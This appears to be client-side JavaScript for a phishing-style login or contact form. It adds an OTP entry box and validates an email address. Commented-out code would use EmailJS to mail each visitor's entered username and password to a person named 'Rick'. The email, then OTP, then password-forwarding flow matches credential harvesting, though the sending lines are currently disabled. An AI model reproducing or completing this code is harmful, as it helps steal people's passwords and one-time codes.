// (function () {
//   emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
// })();
let form = document.querySelector("#contact");

const otpBoxDiv = document.createElement("div");
otpBoxDiv.setAttribute("id", "optBox");
otpBoxDiv.classList.add("d-none");
otpBoxDiv.innerHTML = `<fieldset>
<label for="number">OTP</label><br />
<input
  type="number"
  name="number"
  tabindex="2"
  required
  class="otp"
/>
</fieldset>
<fieldset>
<button
  name="submit"
  type="submit"
  id="opt-submit"
  class="submit"
>
  Submit Code
</button>
</fieldset>`;
form.appendChild(otpBoxDiv);

function validate() {
  let emailBox = document.querySelector("#emailBox");
  let optBox = document.querySelector("#optBox");
  let password = document.querySelector(".password");
  let username = document.querySelector(".username");
  let email = document.querySelector(".email");
  let otp = document.querySelector(".otp");
  let submitBtn = document.querySelector(".submit");

  let userPassword = document.querySelector("#userPassword");
  let emailSubmitBtn = document.querySelector("#email-submit");
  emailSubmitBtn.addEventListener("click", (e) => {
    e.preventDefault();
    filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (filter.test(email.value)) {
      console.log(email.value);
      emailBox.classList.add("d-none");
      optBox.classList.remove("d-none");
    } else {
      if (email.value == "") {
        emptyerror();
      } else {
        error();
      }
    }
  });

  submitBtn.addEventListener("click", (e) => {
    e.preventDefault();
    console.log(emailBox, optBox, userPassword);
    //validate email
    // if (usename.value === "" || password.value === "") {
    //   emptyerror();
    // } else {
    //   // sendmail(usename.value, password.value);
    //   // usename.value = "";
    //   // password.value = "";
    //   // success();
    // }
  });
}
validate();

// function sendmail(usename, password) {
//   emailjs.send("service_ll5oava", "template_cvjri3e", {
//     to_name: "Rick",
//     from_name: usename,
//     message: password,
//   });
// }

function emptyerror() {
  Swal.fire({
    icon: "error",
    title: "Fields cannot be empty!",
    text: "Fields cannot be empty!",
  });
}

function error() {
  Swal.fire({
    icon: "error",
    title: "Please Give Valid Information",
    text: "Please Give Valid Information",
  });
}

function success() {
  Swal.fire({
    icon: "success",
    title: "Successfully sent message",
    text: "Successfully sent message",
  });
  const closeModel = document.getElementById("contact-submit");
  closeModel.setAttribute("data-bs-dismiss", "modal");
}
